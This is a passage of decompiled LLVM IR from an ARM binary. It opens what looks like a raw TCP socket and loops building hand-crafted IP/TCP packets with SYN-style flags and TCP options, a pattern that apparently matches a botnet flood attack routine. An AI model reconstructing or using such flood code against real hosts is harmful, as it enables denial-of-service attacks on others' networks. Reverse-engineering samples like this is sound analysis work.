  store i32 %v0_c454, i32* %r0.global-to-local, align 4
  %v4_c458 = inttoptr i32 %v0_c444 to i32*
  %v5_c458 = call i32 @function_a45c(i32 %v0_c454, i32* %v4_c458, i32 17, i32 65535)
  %v0_c45c = load i32, i32* @r5, align 4
  store i32 %v0_c45c, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c46c = load i32, i32* @r4, align 4
  store i32 %v0_c46c, i32* %r0.global-to-local, align 4
  %v5_c470 = inttoptr i32 %v0_c45c to i32*
  %v6_c470 = call i32 @function_a45c(i32 %v0_c46c, i32* %v5_c470, i32 18, i32 0)
  %v0_c474 = load i32, i32* @r5, align 4
  store i32 %v0_c474, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c484 = load i32, i32* @r4, align 4
  store i32 %v0_c484, i32* %r0.global-to-local, align 4
  %v5_c488 = inttoptr i32 %v0_c474 to i32*
  %v6_c488 = call i32 @function_a45c(i32 %v0_c484, i32* %v5_c488, i32 11, i32 0)
  %v0_c48c = load i32, i32* @r5, align 4
  store i32 %v0_c48c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c49c = load i32, i32* @r4, align 4
  store i32 %v0_c49c, i32* %r0.global-to-local, align 4
  %v5_c4a0 = inttoptr i32 %v0_c48c to i32*
  %v6_c4a0 = call i32 @function_a45c(i32 %v0_c49c, i32* %v5_c4a0, i32 12, i32 0)
  %v0_c4a4 = load i32, i32* @r5, align 4
  store i32 %v0_c4a4, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c4b4 = load i32, i32* @r4, align 4
  store i32 %v0_c4b4, i32* %r0.global-to-local, align 4
  %v5_c4b8 = inttoptr i32 %v0_c4a4 to i32*
  %v6_c4b8 = call i32 @function_a45c(i32 %v0_c4b4, i32* %v5_c4b8, i32 13, i32 0)
  %v0_c4bc = load i32, i32* @r5, align 4
  store i32 %v0_c4bc, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c4cc = load i32, i32* @r4, align 4
  store i32 %v0_c4cc, i32* %r0.global-to-local, align 4
  %v5_c4d0 = inttoptr i32 %v0_c4bc to i32*
  %v6_c4d0 = call i32 @function_a45c(i32 %v0_c4cc, i32* %v5_c4d0, i32 14, i32 0)
  %v0_c4d4 = load i32, i32* @r5, align 4
  store i32 %v0_c4d4, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c4e4 = load i32, i32* @r4, align 4
  store i32 %v0_c4e4, i32* %r0.global-to-local, align 4
  %v5_c4e8 = inttoptr i32 %v0_c4d4 to i32*
  %v6_c4e8 = call i32 @function_a45c(i32 %v0_c4e4, i32* %v5_c4e8, i32 15, i32 1)
  %v0_c4ec = load i32, i32* @r5, align 4
  store i32 %v0_c4ec, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c4fc = load i32, i32* @r4, align 4
  store i32 %v0_c4fc, i32* %r0.global-to-local, align 4
  %v5_c500 = inttoptr i32 %v0_c4ec to i32*
  %v6_c500 = call i32 @function_a45c(i32 %v0_c4fc, i32* %v5_c500, i32 16, i32 0)
  %v2_c50c = load i32, i32* @global_var_23394.88, align 4
  store i32 %v2_c50c, i32* %r3.global-to-local, align 4
  %v0_c510 = load i32, i32* @r5, align 4
  store i32 %v0_c510, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c518 = load i32, i32* @r4, align 4
  store i32 %v0_c518, i32* %r0.global-to-local, align 4
  %v5_c51c = inttoptr i32 %v0_c510 to i32*
  %v6_c51c = call i32 @function_a3f0(i32 %v0_c518, i32* %v5_c51c, i32 25, i32 %v2_c50c, i32 %v6_c500)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c530 = call i32 @function_13940(i32 2, i32 3, i32 6)
  store i32 %v3_c530, i32* %r0.global-to-local, align 4
  %v7_c534 = icmp eq i32 %v3_c530, -1
  store i1 %v7_c534, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c530, i32* @sl, align 4
  br i1 %v7_c534, label %dec_label_pc_ca08, label %dec_label_pc_c540

dec_label_pc_c540:                                ; preds = %dec_label_pc_c36c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c548 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c548, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c55c = call i32 @function_138fc(i32 %v3_c530, i32 0, i32 3, i32 %v6_c548, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_c55c, i32* %r0.global-to-local, align 4
  %v7_c560 = icmp eq i32 %v5_c55c, -1
  store i1 %v7_c560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c560, label %dec_label_pc_ca00, label %dec_label_pc_c568

dec_label_pc_c568:                                ; preds = %dec_label_pc_c540
  %v3_c570 = mul i32 %v7_c3c4, 65536
  store i32 %v3_c570, i32* %r0.global-to-local, align 4
  %v0_c574 = load i32, i32* %fp.global-to-local, align 4
  %v3_c574 = mul i32 %v0_c574, 65536
  store i32 %v3_c574, i32* %r4.global-to-local, align 4
  %v0_c578 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_c488, i32* %r2.global-to-local, align 4
  %v3_c584 = urem i32 %v7_c3c4, 65536
  store i32 %v3_c584, i32* %r3.global-to-local, align 4
  %v3_c588 = urem i32 %v0_c574, 65536
  %v3_c58c = urem i32 %v0_c578, 65536
  store i32 %v3_c58c, i32* %r1.global-to-local, align 4
  %v0_c590 = load i32, i32* @r7, align 4
  %v2_c590 = icmp eq i32 %v0_c590, 0
  store i1 %v2_c590, i1* %cpsr_z.global-to-local, align 1
  %v1_c5a0 = urem i32 %v6_c488, 256
  store i32 %v1_c5a0, i32* @fp, align 4
  br i1 %v2_c590, label %dec_label_pc_c7f4.preheader, label %dec_label_pc_c5a8

dec_label_pc_c5a8:                                ; preds = %dec_label_pc_c568
  %tmp52 = mul i32 %v5_c458, 256
  %v3_c5c0 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_c3c4, 256
  %v3_c5c4 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v5_c458, 256
  %v4_c5cc = urem i32 %tmp54, 256
  %v5_c5cc = or i32 %v4_c5cc, %v3_c5c0
  store i32 %v5_c5cc, i32* @lr, align 4
  %v1_c5c8 = mul i32 %v7_c3c4, 256
  %v4_c5d0 = and i32 %v1_c5c8, 65280
  %v5_c5d0 = or i32 %v4_c5d0, %v3_c5c4
  %tmp55 = mul i32 %v0_c574, 256
  %v3_c5dc = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_c578, 256
  %v3_c5e0 = and i32 %tmp56, 65280
  %v1_c5e4 = urem i32 %v6_c488, 2
  %v1_c5e8 = urem i32 %v6_c4a0, 2
  %tmp57 = udiv i32 %v0_c574, 256
  %v4_c5ec = urem i32 %tmp57, 256
  %v5_c5ec = or i32 %v4_c5ec, %v3_c5dc
  store i32 %v5_c5ec, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_c578, 256
  %v4_c5f0 = urem i32 %tmp58, 256
  %v5_c5f0 = or i32 %v4_c5f0, %v3_c5e0
  store i32 %v5_c5f0, i32* @r5, align 4
  %v1_c60c = urem i32 %v6_c4b8, 2
  store i32 %v1_c60c, i32* %r2.global-to-local, align 4
  %v1_c610 = urem i32 %v6_c4d0, 2
  store i32 %v1_c610, i32* %r3.global-to-local, align 4
  %v1_c614 = urem i32 %v6_c4e8, 2
  store i32 %v1_c614, i32* %r0.global-to-local, align 4
  %v1_c618 = urem i32 %v6_c500, 2
  store i32 %v1_c618, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext4 = mul nuw i32 %v5_c5d0, 65536
  %v4_c6a0 = sdiv i32 %sext4, 65536
  %tmp = sub nsw i32 0, %v1_c5e8
  %v4_c704 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_c60c
  %v4_c718 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_c610
  %v4_c730 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_c614
  %v3_c744 = and i32 %tmp64, 2
  %v1_c694 = trunc i32 %v6_c3dc to i8
  br label %dec_label_pc_c638

dec_label_pc_c638:                                ; preds = %bb61, %dec_label_pc_c5a8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c640 = call i32 @function_144a8(i32 128, i32 1)
  store i32 %v2_c640, i32* %r0.global-to-local, align 4
  %v3_c644 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c644, i32* %r2.global-to-local, align 4
  %v1_c648 = load i32, i32* @sb, align 4
  %v2_c648 = load i32, i32* @r4, align 4
  %v5_c648 = mul i32 %v2_c648, 4
  %v6_c648 = add i32 %v5_c648, %v1_c648
  %v7_c648 = inttoptr i32 %v6_c648 to i32*
  store i32 %v2_c640, i32* %v7_c648, align 4
  %v0_c64c = load i32, i32* %r2.global-to-local, align 4
  %v3_c64c = mul i32 %v0_c64c, 32
  store i32 %v3_c64c, i32* %r3.global-to-local, align 4
  %v0_c650 = load i32, i32* @sb, align 4
  %v4_c650 = mul i32 %v0_c64c, 4
  %v5_c650 = add i32 %v0_c650, %v4_c650
  %v6_c650 = inttoptr i32 %v5_c650 to i32*
  %v7_c650 = load i32, i32* %v6_c650, align 4
  store i32 %v7_c650, i32* %r4.global-to-local, align 4
  %v5_c654 = mul i32 %v0_c64c, 24
  store i32 %v5_c654, i32* %r3.global-to-local, align 4
  %v1_c658 = load i32, i32* @r8, align 4
  %v2_c658 = add i32 %v1_c658, %v5_c654
  store i32 %v2_c658, i32* %r0.global-to-local, align 4
  %v1_c65c = inttoptr i32 %v7_c650 to i8*
  %v2_c65c = load i8, i8* %v1_c65c, align 1
  %tmp65 = urem i8 %v2_c65c, 16
  %v1_c660 = zext i8 %tmp65 to i32
  %v1_c664 = or i32 %v1_c660, 64
  store i32 %v1_c664, i32* %r3.global-to-local, align 4
  %v1_c668 = trunc i32 %v1_c664 to i8
  store i8 %v1_c668, i8* %v1_c65c, align 1
  %v0_c66c = load i32, i32* %r4.global-to-local, align 4
  %v1_c66c = inttoptr i32 %v0_c66c to i8*
  %v2_c66c = load i8, i8* %v1_c66c, align 1
  %v1_c670 = and i8 %v2_c66c, -16
  %v1_c674 = or i8 %v1_c670, 5
  store i32 %v1_c408, i32* %r3.global-to-local, align 4
  store i8 %v1_c674, i8* %v1_c66c, align 1
  %v2_c684 = load i32, i32* %r4.global-to-local, align 4
  %v3_c684 = add i32 %v2_c684, 1
  %v4_c684 = inttoptr i32 %v3_c684 to i8*
  store i8 %v5_c3c0, i8* %v4_c684, align 1
  store i32 %v1_c3e4, i32* %r2.global-to-local, align 4
  %v0_c68c = load i32, i32* %r3.global-to-local, align 4
  %v2_c68c = icmp eq i32 %v0_c68c, 0
  store i1 %v2_c68c, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_c694 = load i32, i32* %r4.global-to-local, align 4
  %v3_c694 = add i32 %v2_c694, 8
  %v4_c694 = inttoptr i32 %v3_c694 to i8*
  store i8 %v1_c694, i8* %v4_c694, align 1
  %v0_c698 = load i32, i32* %r3.global-to-local, align 4
  %v1_c698 = trunc i32 %v0_c698 to i16
  %v2_c698 = load i32, i32* %r4.global-to-local, align 4
  %v3_c698 = add i32 %v2_c698, 2
  %v4_c698 = inttoptr i32 %v3_c698 to i16*
  store i16 %v1_c698, i16* %v4_c698, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_c6a0, i32* %r1.global-to-local, align 4
  %v0_c6a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c6a4, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_c638
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_c638, %bb
  %v2_c6a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c6a8 = add i32 %v2_c6a8, 9
  %v4_c6a8 = inttoptr i32 %v3_c6a8 to i8*
  store i8 6, i8* %v4_c6a8, align 1
  %v0_c6ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c6ac, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_c6ac = load i32, i32* %r2.global-to-local, align 4
  %v2_c6ac = trunc i32 %v1_c6ac to i16
  %v3_c6ac = load i32, i32* %r4.global-to-local, align 4
  %v4_c6ac = add i32 %v3_c6ac, 6
  %v5_c6ac = inttoptr i32 %v4_c6ac to i16*
  store i16 %v2_c6ac, i16* %v5_c6ac, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_c51c, i32* %r2.global-to-local, align 4
  %v1_c6b4 = load i32, i32* %r4.global-to-local, align 4
  %v2_c6b4 = add i32 %v1_c6b4, 12
  %v3_c6b4 = inttoptr i32 %v2_c6b4 to i32*
  store i32 %v6_c51c, i32* %v3_c6b4, align 4
  %v0_c6b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_c6b8 = add i32 %v0_c6b8, 16
  %v2_c6b8 = inttoptr i32 %v1_c6b8 to i32*
  %v3_c6b8 = load i32, i32* %v2_c6b8, align 4
  store i32 %v3_c6b8, i32* %r3.global-to-local, align 4
  %v0_c6bc = load i32, i32* %r1.global-to-local, align 4
  %v1_c6bc = trunc i32 %v0_c6bc to i16
  %v2_c6bc = load i32, i32* %r4.global-to-local, align 4
  %v3_c6bc = add i32 %v2_c6bc, 4
  %v4_c6bc = inttoptr i32 %v3_c6bc to i16*
  store i16 %v1_c6bc, i16* %v4_c6bc, align 2
  %v0_c6c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c6c0 = load i32, i32* %r4.global-to-local, align 4
  %v2_c6c0 = add i32 %v1_c6c0, 16
  %v3_c6c0 = inttoptr i32 %v2_c6c0 to i32*
  store i32 %v0_c6c0, i32* %v3_c6c0, align 4
  %v0_c6c4 = load i32, i32* @r6, align 4
  %v1_c6c4 = trunc i32 %v0_c6c4 to i16
  %v2_c6c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c6c4 = add i32 %v2_c6c4, 20
  %v4_c6c4 = inttoptr i32 %v3_c6c4 to i16*
  store i16 %v1_c6c4, i16* %v4_c6c4, align 2
  %v0_c6c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c6c8 = add i32 %v0_c6c8, 20
  store i32 %v1_c6c8, i32* %r1.global-to-local, align 4
  %v1_c6cc = add i32 %v0_c6c8, 32
  %v2_c6cc = inttoptr i32 %v1_c6cc to i8*
  %v3_c6cc = load i8, i8* %v2_c6cc, align 1
  %v4_c6cc = zext i8 %v3_c6cc to i32
  store i32 %v4_c6cc, i32* %r3.global-to-local, align 4
  %v1_c6d0 = add i32 %v0_c6c8, 33
  %v2_c6d0 = inttoptr i32 %v1_c6d0 to i8*
  %v3_c6d0 = load i8, i8* %v2_c6d0, align 1
  %v4_c6d0 = zext i8 %v3_c6d0 to i32
  store i32 %v1_c5e4, i32* %r0.global-to-local, align 4
  %v1_c6d8 = urem i8 %v3_c6cc, 16
  %v1_c6dc = or i8 %v1_c6d8, -96
  %v1_c6e0 = and i32 %v4_c6d0, 223
  store i32 %v1_c6e0, i32* %r2.global-to-local, align 4
  store i8 %v1_c6dc, i8* %v2_c6cc, align 1
  %v0_c6e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_c6e8 = load i32, i32* %r0.global-to-local, align 4
  %v4_c6e8 = mul i32 %v1_c6e8, 32
  %v5_c6e8 = or i32 %v4_c6e8, %v0_c6e8
  store i32 %v5_c6e8, i32* %r2.global-to-local, align 4
  store i32 %v5_c5cc, i32* %r3.global-to-local, align 4
  %v1_c6f0 = trunc i32 %v5_c6e8 to i8
  %v2_c6f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_c6f0 = add i32 %v2_c6f0, 13
  %v4_c6f0 = inttoptr i32 %v3_c6f0 to i8*
  store i8 %v1_c6f0, i8* %v4_c6f0, align 1
  %v0_c6f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_c6f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_c6f4 = add i32 %v1_c6f4, 4
  %v3_c6f4 = inttoptr i32 %v2_c6f4 to i32*
  store i32 %v0_c6f4, i32* %v3_c6f4, align 4
  %v0_c6f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c6f8 = add i32 %v0_c6f8, 13
  %v2_c6f8 = inttoptr i32 %v1_c6f8 to i8*
  %v3_c6f8 = load i8, i8* %v2_c6f8, align 1
  %v4_c6f8 = zext i8 %v3_c6f8 to i32
  store i32 %v1_c5e8, i32* %r0.global-to-local, align 4
  %v1_c700 = and i32 %v4_c6f8, 239
  %v5_c704 = or i32 %v1_c700, %v4_c704
  store i32 %v5_c704, i32* %r3.global-to-local, align 4
  %v1_c708 = trunc i32 %v5_c704 to i8
  store i8 %v1_c708, i8* %v2_c6f8, align 1
  %v0_c70c = load i32, i32* %r1.global-to-local, align 4
  %v1_c70c = add i32 %v0_c70c, 13
  %v2_c70c = inttoptr i32 %v1_c70c to i8*
  %v3_c70c = load i8, i8* %v2_c70c, align 1
  %v4_c70c = zext i8 %v3_c70c to i32
  store i32 %v1_c60c, i32* %r3.global-to-local, align 4
  %v1_c714 = and i32 %v4_c70c, 247
  %v5_c718 = or i32 %v1_c714, %v4_c718
  store i32 %v5_c718, i32* %r2.global-to-local, align 4
  %v0_c71c = load i32, i32* @r5, align 4
  %v1_c71c = trunc i32 %v0_c71c to i16
  %v3_c71c = add i32 %v0_c70c, 2
  %v4_c71c = inttoptr i32 %v3_c71c to i16*
  store i16 %v1_c71c, i16* %v4_c71c, align 2
  %v0_c720 = load i32, i32* %r2.global-to-local, align 4
  %v1_c720 = trunc i32 %v0_c720 to i8
  %v2_c720 = load i32, i32* %r1.global-to-local, align 4
  %v3_c720 = add i32 %v2_c720, 13
  %v4_c720 = inttoptr i32 %v3_c720 to i8*
  store i8 %v1_c720, i8* %v4_c720, align 1
  %v0_c724 = load i32, i32* %r1.global-to-local, align 4
  %v1_c724 = add i32 %v0_c724, 13
  %v2_c724 = inttoptr i32 %v1_c724 to i8*
  %v3_c724 = load i8, i8* %v2_c724, align 1
  %v4_c724 = zext i8 %v3_c724 to i32
  store i32 %v1_c610, i32* %r0.global-to-local, align 4
  %v1_c72c = and i32 %v4_c724, 251
  %v5_c730 = or i32 %v1_c72c, %v4_c730
  store i32 %v5_c730, i32* %r3.global-to-local, align 4
  %v1_c734 = trunc i32 %v5_c730 to i8
  store i8 %v1_c734, i8* %v2_c724, align 1
  %v0_c738 = load i32, i32* %r1.global-to-local, align 4
  %v1_c738 = add i32 %v0_c738, 13
  %v2_c738 = inttoptr i32 %v1_c738 to i8*
  %v3_c738 = load i8, i8* %v2_c738, align 1
  %v4_c738 = zext i8 %v3_c738 to i32
  store i32 %v1_c614, i32* %r3.global-to-local, align 4
  %v1_c740 = and i32 %v4_c738, 253
  %v4_c744 = or i32 %v1_c740, %v3_c744
  store i32 %v4_c744, i32* %r2.global-to-local, align 4
  %v1_c748 = trunc i32 %v4_c744 to i8
  store i8 %v1_c748, i8* %v2_c738, align 1
  %v0_c74c = load i32, i32* %r1.global-to-local, align 4
  %v1_c74c = add i32 %v0_c74c, 13
  %v2_c74c = inttoptr i32 %v1_c74c to i8*
  %v3_c74c = load i8, i8* %v2_c74c, align 1
  %v4_c74c = zext i8 %v3_c74c to i32
  store i32 %v1_c618, i32* %r0.global-to-local, align 4
  %v1_c754 = and i32 %v4_c74c, 254
  %v2_c758 = or i32 %v1_c754, %v1_c618
  store i32 %v2_c758, i32* %r3.global-to-local, align 4
  %v1_c75c = trunc i32 %v2_c758 to i8
  store i8 %v1_c75c, i8* %v2_c74c, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_c768 = load i32, i32* %r4.global-to-local, align 4
  %v3_c768 = add i32 %v2_c768, 40
  %v4_c768 = inttoptr i32 %v3_c768 to i8*
  store i8 2, i8* %v4_c768, align 1
  %v0_c76c = load i32, i32* %r2.global-to-local, align 4
  %v1_c76c = trunc i32 %v0_c76c to i8
  %v2_c76c = load i32, i32* %r4.global-to-local, align 4
  %v3_c76c = add i32 %v2_c76c, 41
  %v4_c76c = inttoptr i32 %v3_c76c to i8*
  store i8 %v1_c76c, i8* %v4_c76c, align 1
  %v0_c770 = call i32 @function_f700()
  %v1_c774 = urem i32 %v0_c770, 16
  %v1_c778 = or i32 %v1_c774, 1392
  %tmp66 = mul nuw nsw i32 %v1_c778, 256
  %v3_c784 = add nuw nsw i32 %tmp66, 2048
  %v5_c78c = or i32 %v3_c784, 5
  %v1_c790 = trunc i32 %v5_c78c to i16
  %v2_c790 = load i32, i32* %r4.global-to-local, align 4
  %v3_c790 = add i32 %v2_c790, 42
  %v4_c790 = inttoptr i32 %v3_c790 to i16*
  store i16 %v1_c790, i16* %v4_c790, align 2
  %v2_c798 = load i32, i32* %r4.global-to-local, align 4
  %v3_c798 = add i32 %v2_c798, 44
  %v4_c798 = inttoptr i32 %v3_c798 to i8*
  store i8 4, i8* %v4_c798, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_c7a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c7a8 = add i32 %v2_c7a8, 46
  %v4_c7a8 = inttoptr i32 %v3_c7a8 to i8*
  store i8 8, i8* %v4_c7a8, align 1
  %v0_c7ac = load i32, i32* %r2.global-to-local, align 4
  %v1_c7ac = trunc i32 %v0_c7ac to i8
  %v2_c7ac = load i32, i32* %r4.global-to-local, align 4
  %v3_c7ac = add i32 %v2_c7ac, 47
  %v4_c7ac = inttoptr i32 %v3_c7ac to i8*
  store i8 %v1_c7ac, i8* %v4_c7ac, align 1
  %v0_c7b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_c7b0 = trunc i32 %v0_c7b0 to i8
  %v2_c7b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_c7b0 = add i32 %v2_c7b0, 45
  %v4_c7b0 = inttoptr i32 %v3_c7b0 to i8*
  store i8 %v1_c7b0, i8* %v4_c7b0, align 1
  %v0_c7b4 = call i32 @function_f700()
  store i32 %v0_c7b4, i32* %r0.global-to-local, align 4
  %v2_c7bc = load i32, i32* %r4.global-to-local, align 4
  %v3_c7bc = add i32 %v2_c7bc, 59
  %v4_c7bc = inttoptr i32 %v3_c7bc to i8*
  store i8 6, i8* %v4_c7bc, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_c7cc = load i32, i32* %r4.global-to-local, align 4
  %v2_c7cc = add i32 %v1_c7cc, 48
  %v3_c7cc = inttoptr i32 %v2_c7cc to i32*
  store i32 %v0_c7b4, i32* %v3_c7cc, align 4
  %v0_c7d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c7d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_c7d0 = add i32 %v1_c7d0, 52
  %v3_c7d0 = inttoptr i32 %v2_c7d0 to i32*
  store i32 %v0_c7d0, i32* %v3_c7d0, align 4
  %v0_c7d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c7d4 = trunc i32 %v0_c7d4 to i8
  %v2_c7d4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c7d4 = add i32 %v2_c7d4, 56
  %v4_c7d4 = inttoptr i32 %v3_c7d4 to i8*
  store i8 %v1_c7d4, i8* %v4_c7d4, align 1
  %v0_c7d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c7d8 = trunc i32 %v0_c7d8 to i8
  %v2_c7d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c7d8 = add i32 %v2_c7d8, 58
  %v4_c7d8 = inttoptr i32 %v3_c7d8 to i8*
  store i8 %v1_c7d8, i8* %v4_c7d8, align 1
  %v0_c7dc = load i32, i32* %r1.global-to-local, align 4
  %v1_c7dc = trunc i32 %v0_c7dc to i8
  %v2_c7dc = load i32, i32* %r4.global-to-local, align 4
  %v3_c7dc = add i32 %v2_c7dc, 57
  %v4_c7dc = inttoptr i32 %v3_c7dc to i8*
  store i8 %v1_c7dc, i8* %v4_c7dc, align 1
  %v3_c7e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c7e0, i32* %r3.global-to-local, align 4
  %v1_c7e4 = load i32, i32* %r2.global-to-local, align 4
  %v2_c7e4 = add i32 %v1_c7e4, %v3_c7e0
  store i32 %v2_c7e4, i32* @r4, align 4
  %v1_c7e8 = load i32, i32* @r7, align 4
  %v9_c7e8 = icmp eq i32 %v2_c7e4, %v1_c7e8
  store i1 %v9_c7e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_c7e4, i32* %stack_var_-44, align 4
  %v5_c7f0 = icmp slt i32 %v2_c7e4, %v1_c7e8
  br i1 %v5_c7f0, label %dec_label_pc_c638, label %dec_label_pc_c7f4.preheader

dec_label_pc_c7f4.preheader:                      ; preds = %bb61, %dec_label_pc_c568
  %v0_c7f86 = phi i32 [ 0, %dec_label_pc_c568 ], [ %v1_c7e8, %bb61 ]
  %v3_c970 = icmp eq i32 %v6_c51c, -1
  %v8_c970 = icmp eq i32 %v6_c51c, -1
  %v3_c840 = icmp eq i32 %v3_c584, 65535
  br label %dec_label_pc_c7f4

dec_label_pc_c7f4:                                ; preds = %dec_label_pc_c7f4, %dec_label_pc_c904, %dec_label_pc_c7f4.preheader
  %v0_c7f8 = phi i32 [ %v0_c7f86, %dec_label_pc_c7f4.preheader ], [ 0, %dec_label_pc_c904 ], [ 0, %dec_label_pc_c7f4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c7f8 = icmp eq i32 %v0_c7f8, 0
  store i1 %v2_c7f8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c7f8, label %dec_label_pc_c7f4, label %dec_label_pc_c804

dec_label_pc_c804:                                ; preds = %dec_label_pc_c7f4, %dec_label_pc_c904
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c808

dec_label_pc_c808:                                ; preds = %dec_label_pc_c880, %dec_label_pc_c804
  %v1_c818 = phi i32 [ %v1_c8f4, %dec_label_pc_c880 ], [ 0, %dec_label_pc_c804 ]
  %v5_c80c = mul i32 %v1_c818, 24
  %v1_c810 = load i32, i32* @r8, align 4
  %v2_c810 = add i32 %v1_c810, %v5_c80c
  store i32 %v2_c810, i32* %r3.global-to-local, align 4
  %v1_c814 = add i32 %v2_c810, 20
  %v2_c814 = inttoptr i32 %v1_c814 to i8*
  %v3_c814 = load i8, i8* %v2_c814, align 1
  %v4_c814 = zext i8 %v3_c814 to i32
  store i32 %v4_c814, i32* %r2.global-to-local, align 4
  %v0_c818 = load i32, i32* @sb, align 4
  %v4_c818 = mul i32 %v1_c818, 4
  %v5_c818 = add i32 %v0_c818, %v4_c818
  %v6_c818 = inttoptr i32 %v5_c818 to i32*
  %v7_c818 = load i32, i32* %v6_c818, align 4
  store i32 %v7_c818, i32* @r5, align 4
  %v7_c81c = icmp eq i8 %v3_c814, 31
  store i1 %v7_c81c, i1* %cpsr_z.global-to-local, align 1
  %v1_c820 = add i32 %v7_c818, 20
  store i32 %v1_c820, i32* @r6, align 4
  %tmp67 = icmp ult i8 %v3_c814, 32
  br i1 %tmp67, label %dec_label_pc_c918, label %dec_label_pc_c828

dec_label_pc_c828:                                ; preds = %dec_label_pc_c808
  store i32 %v6_c51c, i32* %r3.global-to-local, align 4
  store i1 %v8_c970, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c970, label %dec_label_pc_c978, label %dec_label_pc_c834

dec_label_pc_c834:                                ; preds = %dec_label_pc_c918, %dec_label_pc_c828
  store i32 %v3_c584, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c840, label %dec_label_pc_c994, label %dec_label_pc_c848

dec_label_pc_c848:                                ; preds = %dec_label_pc_c978, %dec_label_pc_c834
  %v1_c84c = phi i32 [ %v1_c988, %dec_label_pc_c978 ], [ 65535, %dec_label_pc_c834 ]
  store i32 %v3_c588, i32* %r1.global-to-local, align 4
  %v9_c84c = icmp eq i32 %v3_c588, %v1_c84c
  store i1 %v9_c84c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c84c, label %dec_label_pc_c9a8, label %dec_label_pc_c854

dec_label_pc_c854:                                ; preds = %dec_label_pc_c994.dec_label_pc_c854_crit_edge, %dec_label_pc_c848
  %v1_c858 = phi i32 [ %v1_c858.pre, %dec_label_pc_c994.dec_label_pc_c854_crit_edge ], [ %v1_c84c, %dec_label_pc_c848 ]
  store i32 %v3_c58c, i32* %r2.global-to-local, align 4
  %v9_c858 = icmp eq i32 %v3_c58c, %v1_c858
